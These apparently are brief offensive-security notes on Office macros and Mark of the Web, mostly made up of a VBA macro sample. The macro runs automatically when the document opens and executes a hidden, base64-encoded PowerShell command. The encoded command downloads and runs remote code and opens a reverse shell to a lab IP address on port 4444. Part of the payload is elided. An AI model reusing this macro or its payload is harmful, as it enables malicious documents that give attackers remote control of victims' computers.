Whenever any Microsoft Office document is downloaded from the internet, it gets a *Mark of the Web* (MOTW). This happens even if they are zipped or contained otherwise in an ISO or IMG or such.
MS Office macros can give RCE, but they are disabled by default by files with the MOTW.

The macros can be written from scratch in `Visual Basic`.
Macro sample (keep in mind the max char-length is `50`.)

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
